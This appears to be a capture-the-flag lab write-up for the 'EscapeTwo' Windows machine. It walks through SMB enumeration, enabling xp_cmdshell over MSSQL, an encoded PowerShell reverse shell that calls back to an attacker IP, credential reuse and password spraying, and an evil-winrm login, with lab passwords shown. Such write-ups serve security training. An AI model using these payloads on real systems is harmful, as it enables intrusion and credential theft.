# EscapeTwo



### Enumeration Phase

Start with nmap scan

```
nmap 10.10.11.51
```

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Here we have everything standards in windows machine.



### SMB User Crack

Now lets checking out the creds that given to us: `rose / KxEPkKe6R8su`

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

### Checking for File in SMB

```
smbclient -L //10.10.11.51 -U 'rose'
```

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

```
smbclient //10.10.11.51/Accounting\ Department -U rose
```

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

Looking through to the files, download it using the get command and unpack the files.

Inside this file have user creds and we can use later for futher enumeration.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

### Enabling xp\_cmdshell <a href="#finding-vulnerability--enabling-xp_cmdshell" id="finding-vulnerability--enabling-xp_cmdshell"></a>

Using `sa` creds. im able to login tp the MSSQL via admin.

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

To exploit MSSQL and enable xp\_cmdshell im using this command:

```
-- xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
 
-- check
EXEC sp_configure 'xp_cmdshell';
```

\
Now we can send reverse shell payload generated from [RevShell Generator](https://www.revshells.com/). I used Base64 PowerShell #3 and prepared to setup a listener.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```
SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA1ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

The reverse shell obtain after the exec of the command in xp\_cmdshell\


<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

In `C:\` have a folder `SQL2019`.

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Found `sql-Configuration.INI` which is an SQL configuration file in the folder.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

There’s another credential of user `sql_svc` / `WqSZAF6CysDQbGb3`. With this password I’m going to try  password spraying with a list of users that we got in the beginning.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

It matched a user `ryan`.&#x20;

### User Flag

We can now try to log in as ryan using **Evil-WinRM**.&#x20;

```
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

Search for the flag:&#x20;

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
